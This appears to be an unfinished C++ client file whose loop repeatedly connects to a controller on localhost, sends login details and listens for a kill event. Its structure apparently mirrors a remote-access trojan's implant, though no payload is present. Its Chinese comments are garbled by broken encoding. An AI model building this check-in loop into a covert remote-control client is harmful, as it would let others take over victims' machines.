// MyClient.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "MyClient.h"
#include "ClientSocket.h"
#include "macros.h"
#include "login.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// The one and only application object

CWinApp theApp;

using namespace std;

void MyMain();

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// initialize MFC and print and error on failure
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: change error code to suit your needs
			_tprintf(_T("Fatal Error: MFC initialization failed\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: code your application's behavior here.
			MyMain();
		}
	}
	else
	{
		// TODO: change error code to suit your needs
		_tprintf(_T("Fatal Error: GetModuleHandle failed\n"));
		nRetCode = 1;
	}

	return nRetCode;
}

enum
{
	NOT_CONNECT, //  ��û������
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};


void MyMain(){
	char	*lpszHost = "127.0.0.1";
	DWORD	dwPort = 12345;
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
	HANDLE	hEvent = NULL;
	CClientSocket socketClient;
	char	strServiceName[256];
	char	strKillEvent[50];

	while (1){
		// �������������ʱ��������sleep������
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
				}
				// ��һ��
				Sleep(60);
			}
		}
		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}

		// ��¼
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);

		system("pause");
		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		//for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		//{
		//	Sleep(1000);
		//}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
// 		if (!manager.IsActived())
// 			continue;
	}
}